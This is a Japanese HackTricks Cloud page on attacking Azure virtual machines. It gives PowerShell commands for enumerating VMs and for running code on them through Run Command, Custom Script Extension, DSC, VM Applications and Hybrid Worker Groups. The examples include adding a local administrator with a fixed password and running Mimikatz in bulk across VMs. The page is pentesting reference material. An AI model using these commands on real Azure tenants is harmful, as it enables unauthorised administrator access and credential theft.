# Az - 仮想マシン

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

Azureの仮想マシンは、Azureが提供する[オンデマンドでスケーラブルなコンピューティングリソース](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)の一種です。通常、他の選択肢よりもコンピューティング環境をより細かく制御する必要がある場合に仮想マシンを選択します。この記事では、仮想マシンを作成する前に考慮すべき事項、作成方法、および管理方法について説明します。

## 列挙
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VMでコマンドを実行する**

### **VMでのAADログイン**

AzureADで認証されたユーザーにアクセスを許可することができます。例えば、**Linux VM**にアクセスしようとする場合、`ssh username@azure-corp.com@1.1.1.1`（ログインしようとするときに使用したazurecorpのメールアドレスを使用することが重要です）と入力すると、次のようなエラーが発生する場合があります：

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

以下の手順に従ってください。[https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) にアクセスし、コードを入力し、メールアドレスとパスワードを資格情報として使用してSSH接続を行うことができます（ユーザーが十分な権限を持っている場合、`Virtual Machine Administrator Login`または`Virtual Machine User Login`の役割）。

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **カスタムスクリプト拡張の実行**

Azure仮想マシン（VM）拡張機能は、**小さなアプリケーション**であり、**Azure VM**上でのデプロイ後の設定と自動化**タスク**を提供します。たとえば、仮想マシンにソフトウェアのインストール、ウイルス対策、またはスクリプトの実行が必要な場合、VM拡張機能を使用できます。

したがって、書き込みアクセス権限がある場合、任意のコードを実行できます。
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)**はAnsibleに似たツールであり、PowerShell内のホストをコードで設定することができます。DSCはAzure内での拡張機能を持ち、**構成ファイル**のアップロードを可能にします。DSCの[構成ファイル](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document)は構文に関して厳格ですが、DSC拡張機能は非常に甘く、特定の形式に従っていれば**どんなコマンドでも盲目的に実行**します（図5参照）。

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

これは**Az PowerShell**の関数[**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)を使用して行うことができます。DSC拡張機能は、**.PS1**ファイルを要求し、それを**.zip**ファイルにパッケージ化します。実際にはこれは正しいDSC構文ではありませんが、拡張機能のステータスは「失敗」と表示されますが、コードは実行されます。問題は、このコマンドの出力がないことです。ステータスは失敗メッセージで上書きされるためです。

### VM Application Definitions

[VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications)リソースは、Azure VMに**バージョン管理されたアプリケーションを繰り返しデプロイ**する方法です。たとえば、バージョン1.0の**プログラム**を作成し、すべてのAzure VMにデプロイした場合、プログラムを1.1に**更新**すると、同じVM Applicationを使用して別の定義を作成し、アップデートを任意のVMにプッシュすることができます。\
VMにアプリケーションをプッシュできるということは、別のコード実行経路が存在するということです。この方法の欠点は、Application Definitionの設定には[**いくつかの手順**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)が必要ですが、Az PowerShellの**`New-AzGalleryApplication`**および**`New-AzGalleryApplicationVersion`**コマンドレットを使用して実行できます。

このテクニックは、アプリケーションをVMに適用すると自動的にインストールされる**拡張機能「VMAppExtension」**を利用します。この拡張機能は、URIからファイルをディスクにダウンロードし、アプリケーションの名前とまったく同じ名前で保存します。つまり、アプリケーションの名前が「AzApplication」であれば、ディスク上のファイルも「AzApplication」という名前で保存されます。これには、REST API呼び出しの「ManageActions」フィールドを設定してアプリケーションを適切な拡張子でリネームする必要があります。アプリケーション全体を実行したくない場合は、同じREST APIメソッドまたはAzure Portalを介してManageActionsフィールドを悪用して任意のPowerShellコマンドを実行することもできます。設定が完了すると、定義は図8と似たようなものになります。

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

この実行テクニックは残念ながら遅いです（アプリケーションまたはコマンドの実行に約3〜4分かかります）。ただし、比較的新しいため、特定の検出方法が書かれているかどうかは驚きです。

実行は拡張機能によって行われるため、アプリケーションのコピーは`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`にあり、実行のステータスは`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`に保持されます。

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)（HWG）は、Automation Account内の構成された**Runbook**を、構成されたHWGの一部である**Azure Virtual machine**で実行できるようにします。再び、VMには拡張機能が使用され、RunbookコードがVMにデプロイされます。拡張機能が使用されるため、資格情報は無関係であり、コードは**SYSTEM**またはrootとして実行されます。

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Windows 10 VMを使用する場合、スクリプトの実行にはデフォルトではVMにインストールされていないPowerShellバージョン7.1ではなく、PowerShellバージョン5.1でRunbookを実行する必要があります。

## 参考文献

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksの広告を掲載**したい場合や、**最新版のPEASSを入手**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有しましょう。

</details>
